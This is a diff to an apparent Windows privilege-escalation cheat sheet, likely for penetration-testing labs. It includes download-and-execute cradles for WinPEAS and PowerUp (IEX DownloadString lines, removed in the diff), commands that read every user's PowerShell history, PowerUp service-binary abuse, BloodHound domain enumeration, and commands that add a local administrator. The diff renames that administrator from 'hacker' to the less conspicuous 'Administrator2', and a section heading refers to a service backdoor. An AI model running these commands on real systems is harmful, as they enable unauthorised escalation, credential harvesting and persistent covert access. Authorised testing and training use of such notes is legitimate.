@@ -112,24 +112,13 @@ cat (Get-PSReadlineOption).HistorySavePath
 Get-ChildItem -Path C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -Recurse -ErrorAction SilentlyContinue
 ```
 
-## Download and run WinPEAS executable
+## Tee WinPEAS.ps1 
 ```powershell
-curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -o winPEAS.exe
-.\winPEAS.exe
-.\winPEAS.exe | Tee-Object -FilePath "winpeas_output.txt"
-```
-
-## Download and run WinPEAS PowerShell script
-```powershell
-IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')
-Invoke-winPEAS
+.\winPEAS.ps1 | Tee-Object -FilePath "winpeas_output.txt"
 ```
 
 ## Download and run PowerUp.ps1
-```powershell
-IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
-Invoke-AllChecks
-```
+https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
 
 ## Copy PowerUp from Kali and import
 ```powershell
@@ -178,7 +167,9 @@ Write-ServiceBinary
 ```
 
 ## Find modifiable service binaries with PowerUp
-```powershell
+Upload /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
+```
+. .\PowerUp.ps1
 Get-ModifiableServiceFile
 ```
 
@@ -344,8 +335,8 @@ bloodhound-python -d domain.local -u username -p password -gc $IP -c all
 
 ## Add new local administrator user
 ```cmd
-net user hacker Password123! /add
-net localgroup administrators hacker /add
+net user Administrator2 Password123! /add
+net localgroup administrators Administrator2 /add
 ```
 
 ## Create service backdoor
